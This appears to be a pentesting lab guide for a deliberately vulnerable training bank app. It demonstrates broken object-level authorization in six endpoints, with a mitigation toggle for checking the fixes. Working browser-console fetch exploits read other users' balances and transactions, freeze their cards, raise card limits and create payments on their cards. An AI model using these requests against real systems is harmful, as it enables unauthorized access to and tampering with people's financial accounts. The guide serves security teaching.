# Broken Object-Level Authorization
BOLA is the absence or dysfunction of identity verification for read/write permissions through an API endpoint. Its presence effectively grants anyone access to the unprotected objects in question.

## Prerequisites
Browser access to functioning web app and two registered user accounts, at least one of which has:
- One transaction of any amount.
- One virtual card of any limit with a balance >= $0.

***Important Note***

Complete setup of at least one VC is necessary for pentesting and only achievable via CLI.
1. Create VC via web app UI.
2. Issue the following bash command in the backend CLI: `psql -U vuln_user -d vulnerable_bank -h localhost -W`
3. Type the database password shown in the .env file, then press enter.
4. Issue the following SQL command: 'UPDATE virtual_cards SET current_balance = current_balance + 100 WHERE id = <card_id>;'
- Variable <card_id> is the id value of the target card. These are zero indexed and can be identified by issuing the following command in the browser console: 'const token = localStorage.getItem('jwt_token');
fetch('/api/virtual-cards', {
  headers: { Authorization: 'Bearer ' + token }
}).then(r => r.json()).then(d => {
  console.log('Cards:', d.cards);
});'

## Demonstrations
This vulnerability is present in six different functions within app.py. Steps for exploitation and verification of hardening are as follows.

### check_balance_hardened()
Grants attacker access to any user's balance.
#### Exploit
1. Log in as any user and note their <account_number> (visible directly below their account balance).
![alt text](./screenshots/image-2.png)
2. Log out, then log in as any other user.
From here, this may be exploited in one of two ways:
##### via URL
3. Append /check_balance/<account_number> to the root URL. If the root is localhost:5000, the full URL should read localhost:5000/check_balance/<account_number>
4. Press enter, then observe outcome in browser window.

##### via CLI
3. Open the browser console/terminal.
4. Issue the following fetch request as a command, replacing `<ACCOUNT_NUMBER>` with the previously noted account number:
    `const attackerToken = localStorage.getItem('jwt_token');
    fetch('/check_balance/' + '<ACCOUNT_NUMBER>', {
    headers: { Authorization: 'Bearer ' + attackerToken }
    }).then(r => r.json()).then(console.log);`
5. Observe outcome.

#### Mitigate
Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack (either sequence of steps above) and observe outcome:

### get_transaction_history()
Grants attacker access to any user's transaction history.
#### Exploit
Initial steps are identical to those above: log in, note account number, log out, then log in as another user. Specific API endpoint used is the only difference. Similarly, this can follow two paths:
##### via URL
1. Append /transactions/<account_number> to the root URL. If the root is localhost:5000, the full URL should read localhost:5000/transactions/<account_number>
2. Press enter, then observe outcome in browser window.
##### via CLI
1. Open the browser console/terminal.
2. Issue the following fetch request as a command -- replacing `<ACCOUNT_NUMBER>` with the previously noted account number -- and observe outcome:
    `const attackerToken = localStorage.getItem('jwt_token');
    fetch('/transactions/' + '<ACCOUNT_NUMBER>', {
    headers: { Authorization: 'Bearer ' + attackerToken }
    }).then(r => r.json()).then(console.log);`
#### Mitigate
Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack (either sequence of steps above) and observe outcome:

### toggle_card_freeze()
Allows attacker to freeze or unfreeze any user's virtual card.
#### Exploit
1. Log in as any user and open browser console.
2. Issue the following fetch request as a command -- replacing <vc_num> with the virtual card ID of any <em>other</em> user -- and observe outcome:

    `const attackerToken = localStorage.getItem('jwt_token');
    fetch('/api/virtual-cards/' + <vc_num> + '/toggle-freeze', {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + attackerToken }
    }).then(r => r.json()).then(console.log);`

#### Mitigate
Return to root URL (Vulnerable Bank homepage) and click Toggle Mitigation button. Repeat attack and observe outcome:

### get_card_transactions()
Grants attacker access to a collection of transactions related to any virtual card of any user.
#### Exploit
1. Log in as any user and open browser console.
2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:

    `fetch('/api/virtual-cards/' + <vc_num> + '/transactions', {
    method: 'GET',
    headers: { Authorization: 'Bearer ' + localStorage.getItem('jwt_token') }
    }).then(r => r.json()).then(console.log);`

#### Mitigate

### update_card_limit()
Allows attacker to update the limit on any virtual card belonging to any user.
#### Exploit
1. Log in as any user and open the browser console.
2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:

    `fetch('/api/virtual-cards/<vc_num>/update-limit', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + localStorage.getItem('jwt_token')
    },
    body: JSON.stringify({ card_limit: 50000 })
    }).then(r => r.json()).then(console.log);`

#### Mitigate

### create_bill_payment()
Allows attacker to create a payment on the balance of any card belonging to any user.
#### Exploit
1. Log in as any user and open the browser console.
2. Issue the following fetch request as a command -- replacing <vc_num> with any integer corresponding to another user's virtual card ID -- and observe outcome:

    `const attackerToken = localStorage.getItem('jwt_token');
    fetch('/api/bill-payments/create', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        Authorization: 'Bearer ' + attackerToken
    },
    body: JSON.stringify({
        biller_id: 1,
        amount: 1.0,
        payment_method: 'virtual_card',
        card_id: <vc_num>,
        description: 'test' // Can be any string
    })
    }).then(r => r.json()).then(console.log);`
